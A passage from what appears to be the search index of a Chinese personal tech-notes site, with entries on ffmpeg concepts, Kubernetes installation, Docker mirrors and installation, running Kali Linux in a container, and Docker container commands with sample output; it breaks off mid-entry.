以帧为单位实现压缩数据和原始数据之间的相互转换, 对视频进行压缩或者解压缩，CODEC = COde（编码） +DECode（解码）。 复用/解复用(mux/demux) 把不同的流按照某种容器的规则放入容器，这种行为叫做复用（mux）。 把不同的流从某种容器中解析出来，这种行为叫做解复用(demux)。 帧率 帧率也叫帧频率，帧率是视频文件中每一秒的帧数，肉眼想看到连续移动图像至少需要15帧。 码率 比特率(也叫码率，数据率)是一个确定整体视频/音频质量的参数，秒为单位处理的字节数，码率和视频质量成正比，在视频文件中中比特率用bps来表达。 参考:: https://zhuanlan.zhihu.com/p/117523405 https://cloud.tencent.com/developer/article/1773248","tags":"杂乱无章","url":"/yq-docs-Chaotic-ffmpeg.html","loc":"/yq-docs-Chaotic-ffmpeg.html"},{"title":"集群安装","text":"集群安装 k8s集群主流安装方式对比分析 minikube 二进制安装 kubeadm等安装工具 核心组件 静态Pod的方式: ## etcd, apiserver, controller-manager, kube-scheduler\n$ kubectl -n kube-system get po systemd服务方式: $ systemctl status kubelet","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-K8S-Cluster-installation.html","loc":"/yq-docs-Container-and-cluster-K8S-Cluster-installation.html"},{"title":"docker配置镜像","text":"后面看到github上有: https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6 镜像配置概述 由于网络原因官方镜像下载很慢, 所以需要配置镜像加速. 配置成功后都是执行 docker info ,查看输出是否有自己配置的镜像地址. linux 适用于linux, 将配置加到 /etc/docker/daemon.json mkdir -p /etc/docker\ntee /etc/docker/daemon.json <<-'EOF' { \"registry-mirrors\": [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\", \"https://ypzju6vq.mirror.aliyuncs.com\", \"https://registry.docker-cn.com\", \"http://hub-mirror.c.163.com\", \"https://docker.mirrors.ustc.edu.cn\" ] } EOF systemctl daemon-reload\nsystemctl restart docker mac 右键点击桌面顶栏的 docker 图标, 选择 Preferences (偏好) , 在 Docker Engine 标签下的 Registry mirrors 列表中将镜像地址的数组: \"registry-mirrors\": [\"https://你的前缀地址.http://mirror.aliyuncs.com\"] 点击 Apply & Restart 按钮, 等待Docker重启并应用配置的镜像加速器。 注解 原以为mac也是跟linux类似, 结果在 /etc/docker/daemon.json 加入了配置不生效.\n思索了一下可能有两个原因: Docker for Mac 跟命令行安装的docker不一致 mac下安装的docker只能在应用内配置 更正, 是这两个原因也不是, mac下一般都是用的用户安装的, 所以默认的配置地址为 ~/.docker/daemon.json , 而非 etc 下的目录. 镜像参考 { \"registry-mirrors\" : [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\" , \"https://ypzju6vq.mirror.aliyuncs.com\" , \"https://registry.docker-cn.com\" , \"http://hub-mirror.c.163.com\" , \"https://docker.mirrors.ustc.edu.cn\" ] } 官方国区docker \"https://registry.docker-cn.com\" 网易 \"http://hub-mirror.c.163.com\" 中科大 \"https://docker.mirrors.ustc.edu.cn\"` 不同系统容器与镜像位置 linux cd /var/lib/docker - 容器与镜像存放在此目录下 镜像位置: /var/lib/docker/image 容器位置: /var/lib/docker/containers mac, 不同版本或许可能文件版本不一样 /Users/xxxxmyname/Library/Containers/com.docker.docker/Data ,可以到上面的目录中, 查看文件大小, du -sh * 本机存放位置如下: /Users/xxxxmyname/Library/Containers/com.docker.docker/Data/vms/0/data/Docker.raw 注解 设置docker清华源可参考: Docker Community Edition 镜像使用帮助 另外一般 apt 更新提示校验不一致的, 一般就是国内镜像源没有更新. 补充一个自己 Ubuntu 服务器配置Docker的命令集 # 如果你过去安装过 docker，先删掉: sudo apt-get remove docker docker-engine docker.io containerd runc # 首先安装依赖: sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common # 根据你的发行版，下面的内容有所不同。你使用的发行版： # Ubuntu # 信任 Docker 的 GPG 公钥: curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg # 添加软件仓库: echo \\ \"deb [arch= $( dpkg --print-architecture ) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $( lsb_release -cs ) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null # 最后安装 sudo apt-get update\nsudo apt-get install docker-ce","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html","loc":"/yq-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html"},{"title":"docker容器化下的协作开发","text":"持续交付部署 保障一致性的环境 开发人员 代码写好之后，还会开发 dockerfile 脚本完成，\n将代码，和环境依赖，全部打包为一个镜像文件(images) 测试 直接拿 images, docker run 运维 直接拿 images, docker run","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html","loc":"/yq-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html"},{"title":"docker使用","text":"常见 基于 dockerfile 直接打包images 常见使用 虚拟机 + 容器","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Docker-use.html","loc":"/yq-docs-Container-and-cluster-docker-Docker-use.html"},{"title":"docker","text":"对进程进行封装隔离，属于操作系统层面的虚拟化技术。 利用Docker可以实现开发，测试，生产环境的部署一致性，极大的减少运维成本。 结构 简而言之 最上层是可写层(容器层), 操作都是在这里进行 下面的镜像层只读 容器层的操作遵循 写时复制 ; 当在这里修改一个文件时, 会自顶向下的找文件, 找到后复制到容器层然后修改;\n如果是删除, 也不会删除底层镜像内容, 而只是标记为删除状态. 概述 三个基本概念 镜像（Image） Docker 镜像（Image）, 就相当于是一个 root 文件系统。\n比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器（Container） 镜像（Image）和容器（Container）的关系,\n就像是面向对象程序设计中的类和实例一样,\n镜像是静态的定义, 容器是镜像运行时的实体。\n容器可以被创建、启动、停止、删除、暂停等。 仓库（Repository） 仓库可看成一个代码控制中心, 用来保存镜像。 Docker 使用客户端-服务器 (C/S) 架构模式, 使用远程API来管理和创建Docker容器。 Docker 容器通过 Docker 镜像来创建。 容器与镜像的关系类似于面向对象编程中的对象与类。 容器与镜像的关系 Docker 面向对象 容器 对象 镜像 类 注解 有个误解, Docker不完全代表容器;\nDocker只是实现了容器技术的一种方式 官方一些的释义 正式一些说明 相对官方一些的说明 概念 说明 Docker 镜像(Images) Docker 镜像是用于创建 Docker 容器的模板, 比如 Ubuntu 系统。 Docker 容器(Container) 容器是独立运行的一个或一组应用, 是镜像运行时的实体。 Docker 客户端(Client) Docker 客户端通过命令行或者其他工具使用 Docker SDK ( https://docs.docker.com/develop/sdk/ ) 与 Docker 的守护进程通信。 Docker 主机(Host) 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。 Docker Registry Docker 仓库用来保存镜像, 可以理解为代码控制中的代码仓库。Docker Hub([ https://hub.docker.com](https://hub.docker.com/ )) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常, 一个仓库会包含同一个软件不同版本的镜像, 而标签就常用于对应该软件的各个版本。我们可以通过 <仓库名>:<标签> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签, 将以 latest 作为默认标签。 Docker Machine Docker Machine是一个简化Docker安装的命令行工具, 通过一个简单的命令行即可在相应的平台上安装Docker, 比如VirtualBox、 Digital Ocean、Microsoft Azure。 安装-服务器版 自动安装 使用官方安装脚本自动安装 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 使用国内 daocloud 一键安装命令： curl -sSL https://get.daocloud.io/docker | sh 手动安装 卸载旧版本 Docker 的旧版本被称为 docker, docker.io 或 docker-engine 。如果已安装, 请卸载它们： sudo apt-get remove docker docker-engine docker.io containerd runc 当前称为 Docker Engine-Community 软件包 docker-ce 。 使用 Docker 仓库进行安装 在新主机上首次安装 Docker Engine-Community 之前, 需要设置 Docker 仓库。之后, 您可以从仓库安装和更新 Docker 。 设置仓库 更新 apt 包索引: $ sudo apt-get update 安装 apt 依赖包, 用于通过HTTPS来获取仓库: $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common 添加 Docker 的官方 GPG 密钥： $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符, 验证您现在是否拥有带有指纹的密钥。 $ sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017 -02-22 [ SCEA ] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown ] Docker Release ( CE deb ) <docker@docker.com> sub rsa4096 2017 -02-22 [ S ] 使用以下指令设置稳定版仓库 $ sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \\ $( lsb_release -cs ) \\\nstable\" 安装 Docker Engine-Community 更新 apt 包索引: $ sudo apt-get update 安装最新版本的 Docker Engine-Community 和 containerd , 或者转到下一步安装特定版本： $ sudo apt-get install docker-ce docker-ce-cli containerd.io 要安装特定版本的 Docker Engine-Community, 请在仓库中列出可用版本, 然后选择一种安装。列出您的仓库中可用的版本： $ apt-cache madison docker-ce docker-ce | 5 :18.09.1~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 5 :18.09.0~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.1~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.0~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages ... 使用第二列中的版本字符串安装特定版本, 例如 5:18.09.1~3-0~ubuntu-xenial: $ sudo apt-get install docker-ce=<VERSION_STRING> docker-ce-cli=<VERSION_STRING> containerd.io 测试 Docker 是否安装成功, 输入以下指令, 打印出以下信息则安装成功: $ sudo docker run hello-world Unable to find image 'hello-world:latest' locally latest: Pulling from library/hello-world 1b930d010525: Pull complete Digest: sha256:c3b4ada4687bbaa170745b3e4dd8ac3f194ca95b2d0518b417fb47e5879d9b5f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1 . The Docker client contacted the Docker daemon. 2 . The Docker daemon pulled the \"hello-world\" image from the Docker Hub. ( amd64 ) 3 . The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4 . The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Introduction-to-docker.html","loc":"/yq-docs-Container-and-cluster-docker-Introduction-to-docker.html"},{"title":"一些坑","text":"挂载本地卷不同步 使用 -v 挂载的卷不同步, 搜了一下大多都说是权限问题, 不认可... 重启容器未解决. 最后重启电脑解决了.","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Some-pits.html","loc":"/yq-docs-Container-and-cluster-docker-Some-pits.html"},{"title":"windows安装Ubuntu","text":"环境 系统: windows11 安装概述 安装虚拟机 windows上一般都是用的 Wmware Woprkstation , 官网下载地址: Wmware Woprkstation下载页面 , 截至2022-12-11, 最新版为17Pro, 安装包下载地址: Wmware Woprkstation安装包 . jihuo: 许可证密钥 . 安装Ubuntu 官网 下载镜像安装. 设置 换源 我使用的是清华源, 备份原来内容, 将新地址写入即可 # 默认注释了源码镜像以提高 apt update 速度, 如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # 预发布软件源, 不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse 备份: mv /etc/apt/sources.list /etc/apt/sources.list.bak 写入: echo \"上面源地址\" >/etc/apt/sources.list ,或者直接vi进去修改(第一次安装的系统没有vim) 注解 注意源地址后面的 jammy 代表了当前版本是 Ubuntu 22, 可以通过 lsb_release -a 查看 查看当前已安装Ubuntu版本 不是安装的22版本的注意换成自己对应版本的代号. docker run时候配置映射路径 windows与linux路径分隔符不一样，不过还是可以使用linux的分隔符传入， 比如我本地的路径是: D:\\project\\rst-document\\build 可以这样传入: docker run --name mynginx -p80:80 -v \"/D/project/rst-document/build/html:/usr/share/nginx/html\" -d nginx","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html","loc":"/yq-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html"},{"title":"Docker安装Kali","text":"命令 # 拉取镜像 docker pull kalilinux/kali-rolling # 查看 docker images # 运行 # -t 让 docker 分配一个伪终端并绑定到容器的标准输入上 # -p 映射端口, # -d 保持后台运行， # -c 执行一些命令 # docker run -t -d -p 60000:22  -p 60001:5901 -p 60002:5902 fd54aef8e4ea  /bin/sh -c \"while true; do echo hello world; sleep 1; done\" docker run --rm -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling\ndocker run -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling # 查看容器 docker ps # 进入 docker exec -it mykali /bin/bash 系统环境配置 # 修改 root 用户密码\npasswd root 国内修改镜像源 # 阿里云镜像源\nvi /etc/apt/sources.list\n\n#中科大\n\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n\n#阿里云\n\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#清华大学\n\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#浙大\n\ndeb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n\ndeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n\n#东软大学\n\ndeb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n\ndeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#官方源\n\ndeb http://http.kali.org/kali kali-rolling main non-free contrib\n\ndeb-src http://http.kali.org/kali kali-rolling main non-free contrib\n\n#163\ndeb http://mirrors.163.com/debian/ jessie main non-free contrib\ndeb http://mirrors.163.com/debian/ jessie-updates main non-free contrib\ndeb http://mirrors.163.com/debian/ jessie-backports main non-free contrib\ndeb-src http://mirrors.163.com/debian/ jessie main non-free contrib\ndeb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib\ndeb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib\ndeb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib\ndeb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib SSH服务 # 更新系统\napt-get update && apt-get upgrade\n# 安装所需软件\napt-get install vim net-tools openssh-server\n# 修改 vim 配置文件，允许 root 用户远程登录\nvim /etc/ssh/sshd_config\n\n#启动 ssh 服务\nservice ssh start\n#允许开机自启动\nsystemctl enable ssh 通过60000端口ssh连接 必要工具安装 apt update\napt install lsb-release vim git python3 net-tools kali-linux-everything 注解 kali-linux-everything 太大了, 几个G了还没完 官网建议这样装: # apt update && apt -y install <package> apt update && apt -y install kali-linux-headless\napt update && apt -y install kali-linux-large","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker-installation-Kali.html","loc":"/yq-docs-Container-and-cluster-docker-docker-installation-Kali.html"},{"title":"容器生命周期管理","text":"run 创建一个新的容器并运行一个命令, 如果没有会自动pull拉取 语法: docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 注解 [COMMAND] [ARG...] 会覆盖 dockerfile 的 CMD OPTIONS说明: -a stdin 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d 不使用此选项就直接在当前命令行窗口前台执行; -i 以交互模式运行容器，通常与 -t 同时使用； -P 随机端口映射，不加参数就是对于容器内打开的所有端口, 自动寻找主机空闲端口映射 -p 指定端口映射，格式为: 主机(宿主)端口:容器端口 -t 为容器重新分配一个伪输入终端，通常与 -i 同时使用； --name= <name> 为容器指定一个名称； --dns <8.8.8.8> 指定容器使用的DNS服务器，默认和宿主一致； --dns-search <example.com> 指定容器DNS搜索域名，默认和宿主一致； -h mars 指定容器的hostname； -e <username=ritchie> 设置环境变量； --env-file= <env_file> 从指定文件读入环境变量； --cpuset= <nums> 如 --cpuset=\"0-2\" --cpuset=\"0,1,2\", 绑定容器到指定CPU运行； -m 设置容器使用内存最大值； --net= bridge 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； --link= <link> 添加链接到另一个容器； --expose= <ports> 开放一个端口或一组端口； --volume , -v 绑定一个卷, 格式为 $宿主机目录:$容器内目录:权限 , 权限默认读写 --rm 退出容器时, 自动删除此容器 --restart always表示检测到挂掉后自定重启 注解 一般不跟任何参数: docker run $image_name 总是会产生一个挂掉的容器,\n只有容器内有进程运行的时候, 才不会挂掉 容器内的进程 , 容器内的进程必须处于前台运行状态，否则容器就会直接退出 关于 -v 第三个权限参数 比如在 Docker 中使用 /etc/localtime:/etc/localtime:ro 的 ro 参数表示以只读(read-only)的方式挂载目录。 除了 ro 参数,在挂载目录时还可以使用以下参数: rw: 以读写模式挂载目录(默认行为)。 z: 将共享卷标记为可以被多个容器访问。 Z: 将私有卷标记为可以被多个容器访问。 nocopy: 在创建新卷时不复制源目录的内容。 delegated: 设置容器内的卷挂载模式为\"代理\"(更新主机优先)。 cached: 设置容器内的卷挂载模式为\"缓存\"(更新容器优先)。 这些参数可以根据需求进行组合使用,以满足不同的挂载要求。比如 rw,z 表示以读写模式挂载并且标记为可共享。 示例 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx: docker run --name mynginx -d nginx:latest 使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口: docker run -P -d nginx:latest 使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data: docker run -p 80:80 -v /data:/data -d nginx:latest 绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上: $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash 使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令: runoob@runoob:~$ docker run -it nginx:latest /bin/bash\nroot@b8573233d675:/# start/stop/restart docker start :启动一个或多个已经被停止的容器 docker stop :停止一个运行中的容器 docker restart :重启容器 语法 docker start [OPTIONS] CONTAINER [CONTAINER...] docker stop [OPTIONS] CONTAINER [CONTAINER...] docker restart [OPTIONS] CONTAINER [CONTAINER...] 示例 启动名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker ps -a\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Exited ( 137 ) 44 hours ago qinglong\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker start qinglong\nqinglong\nyanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong\nyanque@yanquedembp ~ % 停止名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker stop qinglong\nqinglong\nyanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nyanque@yanquedembp ~ % 重启名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker restart qinglong\nqinglong\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 3 seconds 0 .0.0.0:5700->5700/tcp qinglong\nyanque@yanquedembp ~ % kill docker kill :杀掉一个运行中的容器 语法 docker kill [OPTIONS] CONTAINER [CONTAINER...] OPTIONS说明: -s 向容器发送一个信号 示例 杀掉运行中的容器 qinglong yanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 26 seconds 0 .0.0.0:5700->5700/tcp qinglong\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker kill -s KILL qinglong\nqinglong\nyanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nyanque@yanquedembp ~ % rm docker rm : 删除一个或多个容器。 语法 docker rm [OPTIONS] CONTAINER [CONTAINER...] OPTIONS说明: -f 通过 SIGKILL 信号强制删除一个运行中的容器。 -l 移除容器间的网络连接，而非容器本身。 -v 删除与容器关联的卷。 示例 强制删除容器 db01、db02: docker rm -f db01 db02 移除容器 nginx01 对容器 db01 的连接，连接名 db: docker rm -l db 删除容器 nginx01, 并删除容器挂载的数据卷: docker rm -v nginx01 删除所有已经停止的容器: docker rm $(docker ps -a -q) pause/unpause docker pause :暂停容器中所有的进程。 docker unpause :恢复容器中所有的进程。 语法 docker pause CONTAINER [CONTAINER...] docker unpause CONTAINER [CONTAINER...] OPTIONS说明: -s 向容器发送一个信号 示例 暂停数据库容器db01提供服务: docker pause db01 恢复数据库容器 db01 提供服务: docker unpause db01 create docker create : 创建一个新的容器但不启动它, 用法同 docker run 语法 docker create [OPTIONS] IMAGE [COMMAND] [ARG...] 用法同 docker run 示例 使用docker镜像 yanquer/kali:config_apt_list2 创建一个容器,并将容器命名为 mykali yanque@yanquedembp ~ % docker images\nREPOSITORY               TAG                IMAGE ID       CREATED         SIZE\nyanquer/kali             config_apt_list2   24b7cbbe11fb   2 days ago      236MB\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker create -t -p 60000:5900 -p 60001:5901 -p 60002:5902 --name mykali yanquer/kali:config_apt_list2\nWARNING: The requested image's platform (linux/arm64) does not match the detected host platform (linux/amd64) and no specific platform was requested\nfa15654fc7d19605dbc2415e09d279bfc1d898efae6b1ff8f87f27940aa94cd8\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % docker ps -a\nCONTAINER ID   IMAGE                           COMMAND                  CREATED              STATUS                        PORTS     NAMES\nfa15654fc7d1   yanquer/kali:config_apt_list2   \"bash\"                   About a minute ago   Created                                 mykali exec docker exec : 在运行的容器中执行命令 语法 docker exec [OPTIONS] CONTAINER COMMAND [ARG...] OPTIONS说明: -d 分离模式, 在后台运行 -i 即使没有附加也保持STDIN 打开 -t 分配一个伪终端 示例 调用容器 mykali 执行 ls /usr : yanque@yanquedembp ~ % docker exec -it mykali ls /usr\nbin  games  include  lib  libexec  local  sbin        share  src 容器开启一个交互模式终端: yanque@yanquedembp ~ % docker exec -it mykali /bin/bash\n┌──(root㉿fa15654fc7d1)-[/]\n└─# 注解 执行指令时的对象, 可以是容器名, 也可以是容器id","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html"},{"title":"容器操作","text":"ps 列出容器 语法 docker ps [OPTIONS] OPTIONS说明 -a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 --format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 --no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。 示例 列出所有在运行的容器信息。 yanque@yanquedembp ~ % docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 输出详情介绍： CONTAINER ID: 容器 ID。 IMAGE: 使用的镜像。 COMMAND: 启动容器时运行的命令。 CREATED: 容器的创建时间。 STATUS: 容器状态。 STATUS 状态有7种： created（已创建） restarting（重启中） running（运行中） removing（迁移中） paused（暂停） exited（停止） dead（死亡） PORTS: 容器的端口信息和使用的连接类型（tcpudp）。 NAMES: 自动分配的容器名称。 列出最近创建的5个容器信息。 yanque@yanquedembp ~ % docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nde1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Exited ( 137 ) 3 hours ago qinglong 列出所有创建的容器ID。 yanque@yanquedembp ~ % docker ps -a -q\nde1871a5ebeb inspect docker inspect : 获取容器/镜像的元数据 语法 docker inspect [OPTIONS] NAME|ID [NAME|ID...] OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 --type :为指定类型返回JSON。 示例 获取 python镜像 元数据 yanque@yanquedembp mytest %\nyanque@yanquedembp mytest % docker inspect python [ { \"Id\" : \"sha256:26acbad26a2ca1387add4d4d07957e88d18930fb47580a90313de939873c75d8\" , \"RepoTags\" : [ \"python:latest\" ] , \"RepoDigests\" : [ \"python@sha256:497a6f39e10440ab20242b56693fbc2d0549b515cd585328a702720ff4db6bd5\" ] , \"Parent\" : \"\" , \"Comment\" : \"\" , \"Created\" : \"2017-09-13T14:27:41.728086539Z\" , \"Container\" : \"0018f3382d15704565819e20c299fe0346dcbc3cfc48b17e528dfbc3c068d433\" , \"ContainerConfig\" : { \"Hostname\" : \"0018f3382d15\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"/bin/sh\" , \"-c\" , \"#(nop) \" , \"CMD [\\\"python3\\\"]\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : {} } , \"DockerVersion\" : \"17.06.2-ce\" , \"Author\" : \"\" , \"Config\" : { \"Hostname\" : \"\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"python3\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : null } , \"Architecture\" : \"amd64\" , \"Os\" : \"linux\" , \"Size\" : 689734109 , \"VirtualSize\" : 689734109 , \"GraphDriver\" : { \"Data\" : { \"LowerDir\" : 